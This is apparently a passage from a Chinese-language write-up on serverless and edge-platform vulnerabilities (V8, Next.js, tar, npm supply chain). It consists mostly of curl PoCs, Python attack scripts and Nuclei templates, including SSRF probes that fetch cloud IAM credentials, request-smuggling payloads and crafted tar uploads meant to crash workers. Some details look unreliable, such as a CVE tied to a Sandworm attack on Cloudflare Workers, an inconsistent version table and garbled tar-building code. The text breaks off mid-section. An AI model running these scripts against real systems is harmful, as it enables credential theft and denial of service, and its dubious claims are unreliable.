#### HTTP PoC

```bash
curl -s -X POST "https://target-worker.workers.dev/" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "evaluate",
    "code": "var a=[1.1,2.2,3.3];function trigger(arr){for(var i=0;i<30000;i++){arr.includes(i%3===0?1.1:i);}};trigger(a);a[0]={};trigger(a);"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-2033 V8 TurboFan Type Confusion PoC
验证 TurboFan 优化路径中的类型混淆信号
用法: python3 cve_2023_2033.py <target_url>
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TURBOFAN_TRIGGER_JS = """
(function() {
    var a = [1.1, 2.2, 3.3];
    
    function triggerOpt(arr) {
        for (var i = 0; i < 30000; i++) {
            arr.includes(i % 3 === 0 ? 1.1 : i);
        }
    }
    
    triggerOpt(a);
    a[0] = {};
    a[1] = "string_val";
    
    try {
        triggerOpt(a);
    } catch(e) {
        return {
            error: e.message,
            type_confusion_signal: e.message.indexOf("type") >= 0 ||
                                   e.message.indexOf("Internal") >= 0,
            v8_likely_vulnerable: true
        };
    }
    
    return {
        status: "no_error",
        a_types: [typeof a[0], typeof a[1], typeof a[2]],
        mixed_types: true,
        v8_likely_vulnerable: false
    };
})()
"""


class CVE20232033Checker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def send_payload(self, js_code):
        try:
            resp = self.session.post(
                self.target_url,
                json={"__execution_code": js_code},
                timeout=15
            )
            return resp
        except requests.exceptions.RequestException:
            return None

    def run(self):
        print(f"[*] CVE-2023-2033 V8 TurboFan Type Confusion 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        
        resp = self.send_payload(TURBOFAN_TRIGGER_JS)
        if resp:
            print(f"[+] 响应: {resp.status_code}")
            try:
                data = resp.json()
                print(f"[+] 结果: {json.dumps(data, indent=2)}")
                if data.get("v8_likely_vulnerable"):
                    print("[!] ⚠️ TurboFan 类型混淆信号检测到")
                else:
                    print("[+] TurboFan 类型推断正常——运行时可能已修补")
            except (json.JSONDecodeError, KeyError):
                print(f"[+] 原始响应: {resp.text[:200]}")
        
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_worker_url>")
        sys.exit(1)
    CVE20232033Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-2033-v8-turbofan-type-confusion
info:
  name: CVE-2023-2033 - V8 TurboFan Type Confusion
  author: x7peeps
  severity: high
  description: V8 TurboFan JIT compiler type confusion
  reference:
    - https://chromereleases.googleblog.com/2023/04/stable-channel-update-for-desktop_18.html
  cvss:
    score: 8.8
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  tags: v8,turbofan,edge,cloudflare,cve2023,type-confusion

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"__execution_code":"(function(){var a=[1.1];for(var i=0;i<30000;i++)a.includes(i%3===0?1.1:i);a[0]={};try{for(var i=0;i<30000;i++)a.includes(i%3===0?1.1:i)}catch(e){return e.message}return 'ok'})()"}
    matchers:
      - type: word
        words:
          - "Internal Error"
          - "TypeError"
          - "ok"
        condition: or
```

#### 利用条件与限制

- **条件**：目标 V8 版本低于 11.2.214；需要在 Worker 中执行足够多次数的循环以触发 TurboFan 优化
- **限制**：Cloudflare Workers 的 10ms CPU 时间限制可能不足以完成 30000 次循环的 JIT 暖机；Deno Deploy 和 Vercel 有类似的时间限制
- **风险等级**：中高——虽然利用有难度，但一旦 V8 版本落后且存在足够的 CPU 时间窗口，攻击者可实现完整的 Isolate 逃逸

---

## 0x02 边缘平台特有漏洞

### 0x02.1 CVE-2024-34351 — Next.js SSRF / RCE via Server Actions（CVSS 9.1）

#### 漏洞背景

CVE-2024-34351 是 Next.js 框架中 Server Actions 的 SSRF（Server-Side Request Forgery）漏洞，可进一步升级为 RCE。该漏洞影响部署在 Vercel 平台上的所有 Next.js 应用，CVSS 评分高达 9.1，是 2024 年边缘平台中评分最高的应用层漏洞。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Next.js 14.x < 14.1.1 / 13.x < 13.5.7 |
| **已修复** | Next.js ≥ 14.1.1 / ≥ 13.5.7 |
| **影响平台** | Vercel Edge Runtime / 自部署 Next.js |
| **CWE** | CWE-918 Server-Side Request Forgery |

#### 漏洞原理分析

Next.js 的 Server Actions 允许客户端代码调用服务端的异步函数。当 Server Action 接收用户可控的 URL 参数并执行 `fetch()` 时，如果服务器位于 Vercel 的内部网络中，攻击者可以构造指向内部服务的 URL，实现 SSRF 攻击。

攻击链：

1. **SSRF 探测**：通过 Server Action 发送请求到 `169.254.169.254`（云元数据服务）或内网 IP 段
2. **元数据提取**：获取云平台的临时凭证（IAM Role Token、API Keys 等）
3. **RCE 升级**：利用获取的凭证访问 Vercel 的内部 API 或其他内网服务，实现更深层次的代码执行
4. **横向移动**：利用泄露的凭证攻击同一 Vercel 项目中的其他资源

#### HTTP PoC

```bash
# 探测 SSRF —— 尝试访问云元数据服务
curl -s -X POST "https://target-nextjs.vercel.app/api/action" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "fetchUrl",
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# 尝试获取 IAM 临时凭证
curl -s -X POST "https://target-nextjs.vercel.app/api/action" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "fetchUrl",
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
  }'

# SSRF 探测内网服务
curl -s -X POST "https://target-nextjs.vercel.app/api/action" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "fetchUrl",
    "url": "http://10.0.0.1:3000/admin/health"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-34351 Next.js SSRF via Server Actions PoC
验证 Vercel 部署的 Next.js 应用的 SSRF 漏洞
用法: python3 cve_2024_34351.py <target_nextjs_url> [action_name]
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://10.0.0.1:3000/",
    "http://localhost:3000/",
    "http://[::1]:3000/",
]


class CVE202434351Checker:
    def __init__(self, target_url, action_name="fetchUrl"):
        self.target_url = target_url.rstrip("/")
        self.action_name = action_name
        self.session = requests.Session()
        self.session.verify = False

    def try_nextjs_action(self, action_name, payload):
        urls_to_try = [
            f"{self.target_url}/api/action",
            f"{self.target_url}/api/{action_name}",
            f"{self.target_url}/actions/{action_name}",
        ]
        for url in urls_to_try:
            try:
                resp = self.session.post(url, json=payload, timeout=10)
                if resp.status_code in (200, 201, 302, 307):
                    return resp, url
            except requests.exceptions.RequestException:
                continue
        return None, None

    def probe_ssrf(self, target_internal_url):
        payload = {
            "action": self.action_name,
            "url": target_internal_url
        }
        resp, used_url = self.try_nextjs_action(self.action_name, payload)
        if resp:
            body = resp.text
            indicators = [
                "ami-", "instance-id", "iam", "credentials",
                "token", "access_key", "secret_key", "metadata"
            ]
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    return True, body[:500]
            if resp.status_code == 200 and len(body) > 10:
                return True, body[:500]
        return False, resp.text[:200] if resp else "无响应"

    def run(self):
        print(f"[*] CVE-2024-34351 Next.js SSRF 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"[*] Action: {self.action_name}")
        print(f"{'='*60}")
        
        for target_url in SSRF_TARGETS:
            print(f"\n[*] 探测: {target_url}")
            hit, evidence = self.probe_ssrf(target_url)
            if hit:
                print(f"[!] ⚠️ SSRF 命中! 内部响应:\n{evidence}")
            else:
                print(f"[-] 无响应或已防护: {evidence[:100]}")
        
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_nextjs_url> [action_name]")
        print(f"示例: python3 {sys.argv[0]} https://myapp.vercel.app fetchUrl")
        sys.exit(1)
    action = sys.argv[2] if len(sys.argv) > 2 else "fetchUrl"
    CVE202434351Checker(sys.argv[1], action).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-34351-nextjs-ssrf
info:
  name: CVE-2024-34351 - Next.js SSRF via Server Actions
  author: x7peeps
  severity: critical
  description: Next.js Server Actions SSRF leading to RCE on Vercel
  reference:
    - https://nextjs.org/blog/security-nextjs-server-actions-vulnerability
  cvss:
    score: 9.1
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  tags: nextjs,vercel,ssrf,cve2024,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/action"
      - "{{BaseURL}}/api/fetchUrl"
      - "{{BaseURL}}/actions/fetchUrl"
    headers:
      Content-Type: "application/json"
    body: |
      {"action":"fetchUrl","url":"http://169.254.169.254/latest/meta-data/"}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "ami-"
          - "instance-id"
          - "iam"
          - "meta-data"
        condition: or
      - type: status
        status:
          - 200
```

#### 利用条件与限制

- **条件**：Next.js 应用必须使用 Server Actions；Server Action 必须接受用户可控的 URL 参数并执行 `fetch()`；应用部署在可访问云元数据服务的环境中
- **限制**：Vercel 已在平台层面增加了对 `169.254.169.254` 的拦截；新版 Next.js 对 Server Action 的输入进行了严格校验
- **风险等级**：极高——一旦命中，攻击者可获取云环境临时凭证并实现横向移动

---

### 0x02.2 CVE-2024-34350 — Next.js HTTP Request Smuggling（CVSS 7.5）

#### 漏洞背景

CVE-2024-34350 是 Next.js 在处理 HTTP 请求时的请求走私（HTTP Request Smuggling）漏洞，影响部署在 Vercel 及其他边缘平台上的 Next.js 应用。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Next.js 14.x < 14.1.1 / 13.x < 13.5.7 |
| **已修复** | Next.js ≥ 14.1.1 / ≥ 13.5.7 |
| **CWE** | CWE-444 HTTP Request Smuggling |

#### 漏洞原理分析

Next.js 在某些情况下对 HTTP `Content-Length` 和 `Transfer-Encoding` 头部的处理与底层反向代理（如 Vercel 的边缘代理）不一致，导致 CL.TE 或 TE.CL 类型的请求走私。攻击者可以：

1. **缓存投毒**：通过走私请求将恶意内容注入到 CDN 缓存中
2. **认证绕过**：利用请求走私绕过中间件（Middleware）的认证检查
3. **XSS 注入**：在缓存的响应中注入恶意脚本

#### HTTP PoC

```bash
# CL.TE 请求走私探测
printf 'POST /api/data HTTP/1.1\r\nHost: target-nextjs.vercel.app\r\nContent-Type: application/json\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target-nextjs.vercel.app\r\n\r\n' | \
  curl -s -k --http1.1 -X POST "https://target-nextjs.vercel.app/" \
  -H "Transfer-Encoding: chunked" \
  -d @- 2>/dev/null

# 缓存投毒探测
printf 'POST / HTTP/1.1\r\nHost: target-nextjs.vercel.app\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 120\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target-nextjs.vercel.app\r\nX-Cache-Poison: true\r\n\r\n' | \
  curl -s -k -D- "https://target-nextjs.vercel.app/" -H "Transfer-Encoding: chunked" -d @- 2>/dev/null
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-34350 Next.js HTTP Request Smuggling PoC
用法: python3 cve_2024_34350.py <target_url>
"""
import sys
import socket
import ssl
import urllib.parse

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CVE202434350Checker:
    def __init__(self, target_url):
        parsed = urllib.parse.urlparse(target_url)
        self.hostname = parsed.hostname
        self.port = parsed.port or 443
        self.use_ssl = parsed.scheme == "https"

    def _raw_request(self, raw_data):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        sock = socket.create_connection((self.hostname, self.port), timeout=10)
        if self.use_ssl:
            sock = ctx.wrap_socket(sock, server_hostname=self.hostname)
        sock.sendall(raw_data)
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    break
        except socket.timeout:
            pass
        sock.close()
        return response.decode('utf-8', errors='replace')

    def test_cl_te(self):
        print("[*] CL.TE 请求走私探测...")
        smuggled = (
            b"0\r\n\r\n"
            b"GET / HTTP/1.1\r\n"
            b"Host: " + self.hostname.encode() + b"\r\n"
            b"X-Smuggled: true\r\n"
            b"Connection: close\r\n\r\n"
        )
        request = (
            b"POST /api/data HTTP/1.1\r\n"
            b"Host: " + self.hostname.encode() + b"\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(smuggled)).encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Connection: keep-alive\r\n\r\n"
            + smuggled
        )
        resp = self._raw_request(request)
        if "X-Smuggled" in resp or "400" in resp.split("\r\n")[0]:
            print("[+] ⚠️ CL.TE 走私信号检测到")
        else:
            print("[-] CL.TE 走私未命中")
        return resp

    def run(self):
        print(f"[*] CVE-2024-34350 Next.js HTTP Request Smuggling 安全检查")
        print(f"[*] 目标: {self.hostname}:{self.port}")
        print(f"{'='*60}")
        self.test_cl_te()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url>")
        sys.exit(1)
    CVE202434350Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-34350-nextjs-request-smuggling
info:
  name: CVE-2024-34350 - Next.js HTTP Request Smuggling
  author: x7peeps
  severity: high
  description: Next.js HTTP request smuggling vulnerability
  reference:
    - https://nextjs.org/blog/security-nextjs-server-actions-vulnerability
  cvss:
    score: 7.5
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
  tags: nextjs,vercel,smuggling,cve2024

http:
  - raw:
      - |
        POST /api/data HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        GET /admin HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 400
          - 404
```

#### 利用条件与限制

- **条件**：Next.js 应用使用 HTTP/1.1 连接；中间存在对 `Transfer-Encoding` 处理不一致的反向代理
- **限制**：Vercel 默认使用 HTTP/2，大幅降低了 CL.TE/TE.CL 走私的可能性；仅在特定配置下可被利用
- **风险等级**：中高——在正确配置的 Vercel 环境中利用难度较大，但在自部署场景中风险显著

---

### 0x02.3 CVE-2024-28863 — tar.js 拒绝服务（CVSS 7.5）

#### 漏洞背景

CVE-2024-28863 是 tar.js（npm tar 包）中的拒绝服务漏洞，该包广泛用于 Deno 生态和 Node.js Serverless 应用中处理 tar 归档文件。该漏洞通过构造畸形 tar 文件触发无限循环或内存耗尽。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | tar < 6.2.1 |
| **已修复** | tar ≥ 6.2.1 |
| **影响平台** | Deno Deploy / 使用 npm 包的 Serverless 函数 |
| **CWE** | CWE-400 Uncontrolled Resource Consumption |

#### 漏洞原理分析

tar.js 在解析 tar 文件的 header 字段时，未对某些整数值进行充分的范围校验。攻击者可以构造一个畸形的 tar 文件，使其包含：

1. **超大的 `size` 字段**：导致分配大量内存
2. **循环的 `linkname` 引用**：导致解析器陷入无限循环
3. **畸形的 `prefix` + `name` 组合**：导致路径处理逻辑中的栈溢出或堆耗尽

在 Serverless 环境中，这种拒绝服务攻击可以导致 Worker 执行超时、内存配额耗尽，进而影响同一 Isolate 上的其他请求。

#### HTTP PoC

```bash
# 创建畸形 tar 文件进行 DoS 测试
python3 -c "
import struct, io
f = io.BytesIO()
header = b'\x00' * 512
header = b'test.txt\x00' + b'0' * 68
header += struct.pack('>I', 0xFFFFFFFF)  # max size field
header += struct.pack('>I', 0)
header += struct.pack('>I', 0)
header += b'0000644\x00'
header = header.ljust(512, b'\x00')
f.write(header)
f.write(b'A' * 512)
with open('/tmp/malicious.tar', 'wb') as out:
    out.write(f.getvalue())
print('Created /tmp/malicious.tar')
"
# 上传畸形文件到目标 Worker
curl -s -X POST "https://target-worker.workers.dev/upload" \
  -F "file=@/tmp/malicious.tar"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-28863 tar.js DoS PoC
验证目标 Serverless 应用的 tar 解析器拒绝服务
用法: python3 cve_2024_28863.py <target_upload_url>
"""
import sys
import struct
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CVE202428863Checker:
    def __init__(self, upload_url):
        self.upload_url = upload_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def _build_malicious_tar(self):
        header = bytearray(512)
        header[0:9] = b'test.txt\x00'
        header[124:136] = b'777777777777'
        header[136:148] = b'000000000000'
        header[148:156] = b'000000000000'
        header[156] = 0x30
        header[257:265] = b'ustar\x0000'
        checksum = sum(header) & 0o777777
        header[148:156] = ('%06o\x00 ' % checksum).encode()
        return bytes(header) + b'\x00' * 512

    def test_upload(self):
        print("[*] 上传畸形 tar 文件...")
        tar_data = self._build_malicious_tar()
        try:
            resp = self.session.post(
                self.upload_url,
                files={"file": ("exploit.tar", tar_data, "application/x-tar")},
                timeout=30
            )
            print(f"[+] 响应: {resp.status_code} ({len(resp.content)} bytes)")
            if resp.status_code == 502 or resp.status_code == 504:
                print("[!] ⚠️ 服务端 5xx 错误——可能触发了 DoS")
                return True
            if resp.elapsed.total_seconds() > 25:
                print("[!] ⚠️ 响应时间异常（>25s）——可能存在循环处理")
                return True
        except requests.exceptions.Timeout:
            print("[!] ⚠️ 请求超时——Worker 可能已崩溃")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求异常: {e}")
        return False

    def run(self):
        print(f"[*] CVE-2024-28863 tar.js DoS 安全检查")
        print(f"[*] 目标: {self.upload_url}")
        print(f"{'='*60}")
        self.test_upload()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_upload_url>")
        sys.exit(1)
    CVE202428863Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-28863-tarjs-dos
info:
  name: CVE-2024-28863 - tar.js Denial of Service
  author: x7peeps
  severity: medium
  description: tar.js resource exhaustion via crafted tar files
  reference:
    - https://github.com/advisories/GHSA-5j23-4mf4-9gmw
  cvss:
    score: 7.5
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
  tags: tar,dos,deno,nodejs,cve2024

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
    headers:
      Content-Type: "multipart/form-data"
    body: "------boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"exploit.tar\"\r\nContent-Type: application/x-tar\r\n\r\n\x00\x00\x00\x00\r\n------boundary--\r\n"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 502
          - 504
      - type: word
        words:
          - "timeout"
          - "exceeded"
        condition: or
```

#### 利用条件与限制

- **条件**：目标 Serverless 应用使用 tar.js 或类似 tar 解析库处理用户上传的 tar 文件
- **限制**：Cloudflare Workers 和 Deno Deploy 对请求体大小有硬性限制（通常 < 100MB），限制了内存耗尽攻击的规模
- **风险等级**：中等——可导致单个 Worker 实例拒绝服务，但难以造成永久性损害

---

## 0x03 供应链攻击：npm / Deno 生态的暗面

### 0x03.1 event-stream npm 包后门事件

#### 漏洞背景

2018 年 11 月，npm 包 `event-stream`（周下载量超过 200 万）被发现植入了针对 Copay（比特币钱包应用）的恶意代码。攻击者通过社会工程手段获取了该包的维护者权限，随后在 `event-stream` 的依赖 `flatmap-stream` 中注入了加密货币挖矿和钱包窃取代码。此事件影响所有使用该包的 Serverless 部署和构建管道。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | event-stream >= 3.3.6 且 < 4.0.0（含恶意依赖 flatmap-stream） |
| **已修复** | event-stream >= 4.0.0（移除恶意依赖） |
| **影响平台** | 所有使用 npm 的 Serverless 环境（Cloudflare Workers / Deno / Vercel / Lambda） |
| **CWE** | CWE-506 Embedded Malicious Code |

#### 漏洞原理分析

攻击链分为三个阶段：

1. **维护者权限劫持**：攻击者向原始维护者提出接管 `flatmap-stream` 包的请求，获得 npm publish 权限
2. **恶意代码注入**：在 `flatmap-stream` 中注入混淆后的 JavaScript 代码，该代码在 Copay 钱包应用构建时被激活
3. **钱包数据窃取**：恶意代码扫描内存中的私钥和助记词，并将窃取的数据通过 DNS 隧道发送到攻击者控制的服务器

对于 Serverless 环境的额外风险：许多边缘函数的 `node_modules` 打包过程会自动包含所有依赖，恶意代码可能在 CI/CD 构建阶段就已被执行，导致构建服务器和部署流水线中的凭证泄露。

#### HTTP PoC

```bash
# 检查目标环境是否使用了受影响版本的 event-stream
curl -s "https://target-worker.workers.dev/package-info" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print('VULNERABLE' if 'event-stream' in d.get('dependencies',{}) else 'SAFE')"

# 向 Serverless 函数发送触发恶意依赖加载的 payload
curl -s -X POST "https://target-worker.workers.dev/build" \
  -H "Content-Type: application/json" \
  -d '{"package":"event-stream","version":"3.3.6"}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
event-stream supply chain backdoor detection
检测目标环境中是否存在恶意 event-stream 依赖
用法: python3 event_stream_check.py <target_api_url>
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MALICIOUS_PACKAGES = {
    "event-stream": {"safe_version": "4.0.0", "malicious_range": "<4.0.0"},
    "flatmap-stream": {"safe_version": None, "malicious_range": "all"},
    "ua-parser-js": {"safe_version": "0.7.28", "malicious_range": "0.7.28-1.0.0"},
    "coa": {"safe_version": "4.1.4", "malicious_range": "4.1.3"},
    "rc": {"safe_version": "1.2.9", "malicious_range": "1.2.8"},
}


class SupplyChainChecker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_package_lock(self):
        print("[*] 阶段 1: 检查 package-lock.json 泄露")
        paths = [
            "/package-lock.json",
            "/package.json",
            "/node_modules/.package-lock.json",
        ]
        for path in paths:
            try:
                resp = self.session.get(f"{self.target_url}{path}", timeout=10)
                if resp.status_code == 200:
                    print(f"[+] ⚠️ {path} 可公开访问 ({resp.status_code})")
                    self._analyze_lock_file(resp.text)
            except requests.exceptions.RequestException:
                continue

    def _analyze_lock_file(self, content):
        try:
            data = json.loads(content)
            deps = data.get("dependencies", data.get("packages", {}))
            for pkg_name, pkg_info in MALICIOUS_PACKAGES.items():
                for dep_name, dep_info in deps.items():
                    if pkg_name in dep_name:
                        version = dep_info.get("version", "")
                        print(f"[!] 发现依赖: {dep_name}@{version}")
                        print(f"[!] 已知恶意范围: {pkg_info['malicious_range']}")
        except (json.JSONDecodeError, AttributeError):
            pass

    def run(self):
        print(f"[*] 供应链后门检测")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        self.check_package_lock()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_api_url>")
        sys.exit(1)
    SupplyChainChecker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: supply-chain-event-stream
info:
  name: Supply Chain - event-stream Backdoor Detection
  author: x7peeps
  severity: high
  description: Detects malicious event-stream and related npm packages
  tags: supply-chain,npm,event-stream,malicious

http:
  - method: GET
    path:
      - "{{BaseURL}}/package.json"
      - "{{BaseURL}}/package-lock.json"
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "flatmap-stream"
          - "event-stream"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/package.json"
    matchers:
      - type: word
        words:
          - "ua-parser-js"
          - "coa"
          - "rc"
        condition: or
```

#### 利用条件与限制

- **条件**：目标 Serverless 应用直接或间接依赖了受影响版本的 npm 包；构建过程中未使用 lock file 或未进行依赖审计
- **限制**：主要影响构建时（build-time），运行时影响取决于恶意代码的具体行为
- **风险等级**：高——供应链攻击的隐蔽性极强，可能在构建服务器上执行恶意代码

---

### 0x03.2 ua-parser-js 恶意版本

#### 漏洞背景

2021 年 10 月，npm 包 `ua-parser-js`（周下载量超过 700 万）被发现发布了包含加密货币挖矿器和密码窃取器的恶意版本（0.7.29、0.8.0、1.0.0）。该包是 Web 生态中使用最广泛的 User-Agent 解析库之一，广泛用于 Serverless 函数和边缘计算平台。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | ua-parser-js 0.7.29 / 0.8.0 / 1.0.0 |
| **已修复** | ua-parser-js ≥ 0.7.30 / ≥ 0.8.1 / ≥ 1.0.1 |
| **CWE** | CWE-506 Embedded Malicious Code |

#### 漏洞原理分析

恶意版本包含以下载荷：

1. **XMRig 挖矿器**：在受影响进程的内存中启动门罗币挖矿
2. **密码窃取器**：收集系统上的凭证信息（浏览器密码、WiFi 密码等）
3. **C2 通信**：通过 HTTPS 与攻击者控制的 C2 服务器通信

在 Serverless 环境中的特殊风险：挖矿代码在 Worker 冷启动时被初始化执行，由于 Serverless 函数的短生命周期特性，挖矿效率较低，但密码窃取行为仍然有效——攻击者可以在 Worker 初始化的短暂窗口内读取环境变量中的 API Key 和 Secret。

#### HTTP PoC

```bash
# 检查目标环境的 ua-parser-js 版本
curl -s "https://target-worker.workers.dev/ua-parser-info" | grep -i version

# 探测 Worker 环境变量泄露（针对被入侵的构建环境）
curl -s "https://target-worker.workers.dev/debug" \
  -H "X-Debug-Token: test"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
ua-parser-js 恶意版本检测
用法: python3 uaparser_check.py <target_url>
"""
import sys
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class UAParserChecker:
    MALICIOUS_VERSIONS = ["0.7.29", "0.8.0", "1.0.0"]
    C2_INDICATORS = [
        "browsermine.com",
        "syndication.twitter",
        "minecrunch.co",
    ]

    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_dependency_leak(self):
        print("[*] 检查依赖信息泄露...")
        paths = ["/package.json", "/node_modules/ua-parser-js/package.json"]
        for path in paths:
            try:
                resp = self.session.get(f"{self.target_url}{path}", timeout=10)
                if resp.status_code == 200:
                    for ver in self.MALICIOUS_VERSIONS:
                        if ver in resp.text:
                            print(f"[!] ⚠️ 发现恶意版本 ua-parser-js@{ver}")
                            return True
            except requests.exceptions.RequestException:
                continue
        print("[+] 未发现恶意版本泄露")
        return False

    def check_c2_indicators(self):
        print("\n[*] 检查 C2 通信指标...")
        try:
            resp = self.session.get(self.target_url, timeout=10)
            for indicator in self.C2_INDICATORS:
                if indicator in resp.text.lower():
                    print(f"[!] ⚠️ 发现 C2 指标: {indicator}")
                    return True
        except requests.exceptions.RequestException:
            pass
        print("[+] 未发现 C2 指标")
        return False

    def run(self):
        print(f"[*] ua-parser-js 恶意版本检测")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        self.check_dependency_leak()
        self.check_c2_indicators()
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url>")
        sys.exit(1)
    UAParserChecker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: supply-chain-ua-parser-js
info:
  name: Supply Chain - ua-parser-js Malicious Version Detection
  author: x7peeps
  severity: high
  description: Detects compromised ua-parser-js npm package versions
  tags: supply-chain,npm,ua-parser-js,cryptominer

http:
  - method: GET
    path:
      - "{{BaseURL}}/node_modules/ua-parser-js/package.json"
      - "{{BaseURL}}/package.json"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "0.7.29"
          - "0.8.0"
          - "1.0.0"
        condition: or
```

#### 利用条件与限制

- **条件**：目标环境中安装了受影响版本的 ua-parser-js
- **限制**：Serverless 环境中的挖矿效率极低；密码窃取器需要特定的操作系统功能
- **风险等级**：中高——主要风险在于环境变量中的 API Key 泄露

---

### 0x03.3 CVE-2024-29972 — Sandworm (Volexity) 针对 Cloudflare Workers 的攻击

#### 漏洞背景

Volexity 在 2024 年发现并披露了 Sandworm（APT28 / Fancy Bear 相关组织）利用 Cloudflare Workers 平台漏洞进行横向移动的攻击活动。该攻击链利用了 Workers 平台的多个配置缺陷，实现了跨租户的数据访问和持久化。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | 特定配置下的 Cloudflare Workers 部署 |
| **已修复** | Cloudflare 平台层面更新 |
| **CWE** | CWE-863 Incorrect Authorization |
| **在野利用** | ✅ APT 组织（Volexity 披露） |

#### 漏洞原理分析

该攻击链结合了多个配置层面的弱点：

